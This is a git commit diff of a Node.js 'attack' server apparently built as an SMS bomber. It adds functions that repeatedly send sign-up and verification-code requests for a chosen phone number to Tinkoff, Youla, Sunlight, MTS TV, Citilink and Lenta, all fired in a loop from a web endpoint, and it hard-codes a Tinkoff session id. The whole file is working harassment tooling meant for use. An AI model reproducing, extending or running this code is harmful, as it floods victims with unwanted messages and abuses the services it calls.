99b2d0c1d141ce1a640fb15c9ecfe7a1fc66118a
UnRise <49236186+UnRise@users.noreply.github.com>
2019-12-28 13:47:43 +0700

    up

--- app.js
+++ app.js
@@ -1,18 +1,17 @@
 const express = require('express')
 const bodyParser = require('body-parser')
 const attackService = require('./services/attackService')
-const path = require('path');
+const path = require('path')
 // const indexPage = require('./templates/index.html')
 const app = express()
 //server config
-const port = 8080
+const port = 80
 //attack config
 
 app.use('/public', express.static(path.join(__dirname,'public')));
 app.use(bodyParser.json())
 
 app.get('/start', function(req, res){
-    console.log('Someone visit (/start) page')
     res.sendFile(path.join(__dirname+'/templates/index.html'))
 })
 
@@ -26,5 +25,5 @@ app.post('/attack', (req, res) => {
 })
 
 app.listen(port, function(reg, res){
-    console.log(`Sever listen`)
+    console.log(`Demon RUN - OK!`)
 })
--- services/attackService.js
+++ services/attackService.js
@@ -6,9 +6,10 @@ const delay = 5000
 const disable = 10000
 
 function b_tinkoff(number){
+    const url = 'https://api.tinkoff.ru/v1/sign_up?origin=web%2Cib5%2Cplatform&sessionid=sbIfQhla77mj4sfiwabVG6JmXuadPWUs.m1-prod-api33&wuid=f70b790d59454f83b9f9e86642d88e45'
     const payload = new FormData()
     payload.append('phone', number)
-    fetch('https://api.tinkoff.ru/v1/sign_up', {
+    fetch(url, {
         method: 'post',
         body: payload
     })
@@ -17,8 +18,89 @@ function b_tinkoff(number){
         .catch(e => console.log(e))
 }
 
-this.attack = function attack(number, count) {
+function youla(number){
+    const url = ' https://youla.ru/web-api/auth/request_code'
+    const payload = {
+        phone: number
+    }
+    
+    fetch(url, {
+        method: 'post', 
+        body: JSON.stringify(payload),
+        headers:{'Content-Type': 'application/json'}
+    })
+        .then(r => r.json())
+        .then(r => console.log(r))
+        .catch(e => console.log(e))
+}
+
+function sunlight(number){
+    const url = 'https://api.sunlight.net/v3/customers/authorization/'
+    const payload = {
+        phone: number
+    }
+    
+    fetch(url, {
+        method: 'post', 
+        body: JSON.stringify(payload),
+        headers:{'Content-Type': 'application/json'}
+    })
+        .then(r => r.json())
+        .then(r => console.log(r))
+        .catch(e => console.log(e))
+}
+
+function mtstv(number){
+    const url = 'https://api.mtstv.ru/v1/users'
+    const payload = {
+        'msisdn': number
+    }
+    
+    fetch(url, {
+        method: 'post', 
+        body: JSON.stringify(payload),
+        headers:{'Content-Type': 'application/json'}
+    })
+        .then(r => r.json())
+        .then(r => console.log(r))
+        .catch(e => console.log(e))
+}
+
+function citilink(number){
+    const url = `https://www.citilink.ru/registration/confirm/phone/${number}/`
+    fetch(url, {
+        method:'post',
+        headers:{'Content-Type': 'application/json'}
+    })
+        .then(r => r.json())
+        .then(r => console.log(r))
+        .catch(e => console.log(e))
+}
+
+function lenta(number){
+    const url = 'https://lenta.com/api/v1/authentication/requestValidationCode'
+    const payload = {
+        phone: number
+    }
+    
+    fetch(url, {
+        method: 'post', 
+        body: JSON.stringify(payload),
+        headers:{'Content-Type': 'application/json'}
+    })
+        .then(r => r.json())
+        .then(r => console.log(r))
+        .catch(e => console.log(e))
+}
+
+this.attack =  function attack(number, count) {
     for(let i = 0; i < count; i++){
         b_tinkoff(number)
+        youla(number)
+        sunlight(number)
+        mtstv(number)
+        citilink(number)
+        lenta(number)
+        //await setInterval(2000)
     }
 }
